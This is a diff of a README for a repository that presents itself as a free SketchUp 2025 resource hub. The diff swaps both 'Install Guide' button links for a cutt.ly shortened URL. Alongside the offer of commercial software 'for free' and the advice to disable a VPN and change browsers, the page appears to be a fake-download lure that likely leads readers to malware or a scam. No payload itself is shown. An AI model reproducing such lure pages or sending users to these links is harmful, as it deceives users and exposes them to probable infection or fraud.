@@ -5,7 +5,7 @@
 
 **Description**: Bring your 3D design ideas to life with **SketchUp 2025**! This repository offers tutorials, resources, and tips for architects, designers, and hobbyists to explore SketchUp’s powerful tools for modeling and visualization. Start for free with accessible design tools and join our vibrant community of creators in 2025!  
 
-<a href="https://sketchup-free-hub-2025.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/ArNtKqgh" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -36,7 +36,7 @@ Get started with SketchUp 2025 effortlessly with these simple steps! 🛠️
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-<a href="https://sketchup-free-hub-2025.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/ArNtKqgh" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
